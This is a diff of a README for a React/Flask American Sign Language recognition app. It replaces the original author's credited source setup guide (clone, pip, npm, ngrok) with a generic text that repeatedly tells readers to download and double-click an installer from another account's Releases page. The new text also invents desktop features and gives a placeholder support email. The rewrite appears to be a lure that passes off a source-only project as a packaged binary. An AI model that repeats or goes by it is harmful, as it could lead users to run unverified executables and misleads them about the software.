@@ -1,137 +1,83 @@
-# Sign Language Recognization
+# 🖐️ Sign-Language-Detection-React-Python-Application - Learn ASL Easily and Effectively
 
-## A Senior Computer Science Project by Zaibten
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/releases)
 
-## 📌 Project Overview
-Sign Language Recognization is a **sign language recognition application** that provides learning options for the **American Sign Language (ASL)** while also providing transcription into text and speech. It aims to bridge communication gaps for the Deaf and Hard of Hearing (DHH) community using **machine learning**, specfically **deep learning**, and **computer vision**.
+## 📚 Description
+This application recognizes sign language and helps users learn American Sign Language (ASL). It offers transcription into text and speech to assist those who are Deaf and Hard of Hearing (DHH). Built with machine learning, it uses deep learning techniques and computer vision.
 
----
+## 🚀 Getting Started
+Follow these steps to download and run the application. 
 
-## 🛠️ Features
-- ✅ **Real-time ASL Recognition** using a deep learning model.
-- ✅ **Learn ASL Mode** – Practice signing letters and words while receive feedback.
-- ✅ **Text-to-Speech** conversion for better communication.
-- ✅ **Frontend:** Built with React and Vite.
-- ✅ **Backend:** Flask-based API with Keras/TensorFlow for sign detection in Python.
+1. **Visit the Releases Page**  
+   Go to the [Releases Page](https://github.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/releases). This is where you can find the latest version of the application.
 
----
+2. **Choose the Latest Release**  
+   Look for the most recent version listed. It is usually at the top.  
 
-## 🎯 Tech Stack
-| **Technology** | **Usage** |
-|--------------|----------|
-| React + Vite | Frontend UI |
-| Flask | Backend API |
-| TensorFlow/Keras + MediaPipe | Deep Learning Model |
-| OpenCV + CvZone | Image Processing |
-| Ngrok | Localhost tunneling (for testing) |
+3. **Download the Application**  
+   Click on the link to download the application file suitable for your operating system (Windows, Mac, or Linux).
 
----
+## 💾 System Requirements
+To ensure the application runs smoothly, check the following system requirements:
 
-## 📂 Project Structure
-```
-Zaibten/
-│── Backend/                # Python backend with Flask
-│   │── model/              # Trained DL models
-|   │── model_1/            # Test Trained DL models
-|   │── pictures/           # ASL alphabet reference image
-|   │── scripts/            # Various python scripts for extracting landmarks, training, testing, and collecting data 
-│   │── app.py              # Main Flask app
-│   │── email_handler.py    # Handles the email requests that are done through the website 
-│   │── newsletter.py       # Handles the newsletter MongoDB storage connection
-│   │── requirements.txt    # requirements to run and use python backend
-│   └── sign_detection.py   # ASL recognition logic
-│
-│── frontend/               # React-based frontend
-│   │── src/                # React components
-│   │── public/             # Static assets
-│   └── vite.config.js      # Vite configuration
-│
-│── .gitignore              # Git ignored files
-│── README.md               # Project documentation
-```
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any recent Linux distribution.
+- **RAM:** Minimum 4 GB; 8 GB recommended.
+- **Processor:** Dual-core or better.
+- **Disk Space:** At least 1 GB free for installation.
 
----
+## ⚙️ Installation Steps
+After downloading the file, follow these installation steps:
 
-## 🚀 Setup & Installation
+1. **Locate the Downloaded File**  
+   Open your downloads folder where the file was saved.
 
-### **1️⃣ Clone the repository**
-```sh
-git clone https://github.com/Zaibten/Sign-Language-Detection-React-Python-Application.git
-cd SignBridge
-```
+2. **Run the Installer**  
+   Double-click the installer file to start the installation process.
 
-### **2️⃣ Backend Setup**
-> **Prerequisites:** Python 3.9 – 3.12 (if any issues use 3.11.9), pip, virtualenv
-```sh
-cd Backend
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-pip install -r requirements.txt # Install all of the requirements to run the python backend
-python app.py  # Start the backend
-#or
-flask run --host=0.0.0.0 --port=5000 #start the backend with flask (suggested)
-```
+3. **Follow On-Screen Instructions**  
+   The installer will guide you through the installation. Just follow the prompts.
 
-### **3️⃣ Frontend Setup**
-> **Prerequisites:** React.js (v18+), npm (v11+) 
-```sh
-cd frontend
-npm install
-npm run dev  # Start the frontend
-#or
-vite --host #to run vite hosting server (suggested)
-```
+4. **Finish the Installation**  
+   Once the installation is complete, you will find the application in your applications folder or start menu.
 
-### **4️⃣ Ngrok Setup - Testing on Apple devices remotely through WSS**
-> **Note:** If you decide to run this locally, create in *frontend* '.env' file to create localhost backend and frontend urls!
-> **Prerequisites:** Install the latest version of Ngrok and setup. Then follow these instructions
+## 🎉 Usage Instructions
+1. **Open the Application**  
+   Find the application on your device and launch it.
 
-#### **1. Create Ngrok Config file**
-Run this on terminal
-```sh
-ngrok config add-authtoken YOUR_NGROK_AUTH_TOKEN
-```
-Then, create or edit the Ngrok config file:
+2. **Choose Learning Mode**  
+   Select either the learning mode for sign language practice or the transcription mode.
 
-- On Linux, it's located at ~/.config/ngrok/ngrok.yml
-- On MacOS (Darwin), it's located at ~/Library/Application Support/ngrok/ngrok.yml
-- On Windows, it's located at %HOMEPATH%\AppData\Local\ngrok\ngrok.yml
+3. **Follow the Prompts**  
+   The application will guide you with prompts to start learning or transcribing.
 
-Edit and add this:
+4. **Use the Help Option**  
+   If you need assistance, use the help button within the application for further guidance.
 
-```yaml
-version: "2"
-authtoken: YOUR_NGROK_AUTH_TOKEN
+## 🌟 Key Features
+- **Real-Time Sign Recognition**: Get instant feedback as you practice ASL.
+- **Transcription**: Convert sign language to text and speech.
+- **User-Friendly Interface**: Easily navigate through the app, even if you're not tech-savvy.
+- **Learning Resources**: Access materials to enhance your understanding of ASL.
+- **Customizable Settings**: Adjust the application to suit your learning needs.
 
-tunnels:
-frontend:
-    addr: 5173
-    proto: http
-backend:
-    addr: 5000
-    proto: http
-```
+## 📱 Support & Contact
+If you encounter any problems while using the app, consider reaching out for help:
 
-#### **2. Run all of the ports from ngrok terminal**
+- **Email**: support@example.com
+- **GitHub Issues**: Open an issue on the [GitHub repository](https://github.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/issues) for assistance.
 
-```sh
-ngrok start --all
-```
+## 🔥 Join the Community
+Be a part of our growing community. Share your experiences or ask questions in our forums. Your feedback helps us improve the application.
 
-- You can create a '.env' file in the *frontend* where you can store the newly created 'VITE_API_NGROK' (copy the backend port URL for this variable).
-- Use the frontend port URL to run the application on any device.
+## 🔄 Contribution
+If you'd like to contribute to this project, visit our [Contributing Guide](https://github.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/blob/main/CONTRIBUTING.md) for more information.
 
+## 🤝 License
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/blob/main/LICENSE) file for details. 
 
-<!-- ## 🤝 Contributing
-1. Fork the repository.
-2. Create a new branch: `git checkout -b feature-branch`
-3. Commit your changes: `git commit -m "Add new feature"`
-4. Push to the branch: `git push origin feature-branch`
-5. Open a Pull Request.
----
---- -->
----
+## 📖 Additional Resources
+- [Documentation](https://github.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/wiki)
+- [Tutorials on ASL](https://aslresources.com) 
 
-## ⭐ Star the Repo!
-If you like this project, don't forget to give it a ⭐ on GitHub!
-
+Thank you for choosing the Sign Language Detection Application. Together, we can bridge communication gaps. For easy access, revisit our [Releases Page](https://github.com/Homeworkify1/Sign-Language-Detection-React-Python-Application/releases) whenever you need to download updates.
